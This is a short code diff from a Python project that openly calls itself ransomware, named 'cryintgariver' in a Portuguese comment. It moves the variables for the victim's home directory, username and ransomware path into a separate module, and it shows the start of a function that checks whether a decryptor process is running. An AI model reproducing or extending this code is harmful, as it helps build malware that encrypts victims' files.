@@ -7,17 +7,10 @@ from Crypto import Random
 from getters import Getters
 from randomkey import generate_randomKey
 from symencrypt import AESHash
+from paths_and_names import _name, _home, _home, _ransomware_path
 import base64, subprocess, pickle, gc, random, time, os
-get = Getters()
 
-# Nome do ransomware
-_name = ("cryintgariver")
-# recupero o diretório home do usuário
-_home = get.get_home()
-# Recupera o nome de usuário registrado no sistema
-_username = get.get_username()
-#Recupera o caminho do arquivo até o diretório do script
-_ransomware_path = get.get_path(_home, _name)
+get = Getters()
 
 def open_decryptor():
 		process = subprocess.Popen('Pidof decryptor', shell= True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
